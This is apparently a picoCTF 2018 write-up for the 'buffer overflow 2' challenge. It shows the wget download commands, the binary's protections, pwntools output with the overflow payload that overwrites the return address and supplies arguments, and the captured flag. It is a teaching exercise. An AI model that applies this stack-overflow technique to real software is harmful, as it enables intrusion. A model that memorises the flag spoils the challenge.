# buffer overflow 2

__PROBLEM__

Alright, this time you'll need to control some arguments. Can you get the flag from this [program](https://2018shell.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln)? You can find it in /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa on the shell server. [Source](https://2018shell.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln.c).

__HINT__
Try using gdb to print out the stack once you write to it!

__SOLUTION__

```
wget https://2018shell.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln   --no-check-certificate
wget https://2018shell.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln.c --no-check-certificate
```

Solution found in [solver.py](./solver.py)

```sh
python solver.py
(venv) luk6xff@lu:~/Projects/ctf/writeups/picoCTF-2018/Binary-Exploitation/buffer overflow 2$ python solver.py
[*] '/home/luk6xff/Projects/ctf/writeups/picoCTF-2018/Binary-Exploitation/buffer overflow 2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
ELF('/home/luk6xff/Projects/ctf/writeups/picoCTF-2018/Binary-Exploitation/buffer overflow 2/vuln')
b'\xcb\x85\x04\x08'
[+] Connecting to 2018shell4.picoctf.com on port 22: Done
[*] luk6xff@2018shell4.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'cd /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa && ./vuln': Done
b'Please enter your string: \n'
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅\x04BBBBﾭ\xde\xde\xc0\xad\xde
$                                                                                                                            picoCTF{addr3ss3s_ar3_3asy1b78b0d8}bash: line 1: 3723405 Segmentation fault      (core dumped) ./vuln
```

FLAG - `picoCTF{addr3ss3s_ar3_3asy1b78b0d8}`
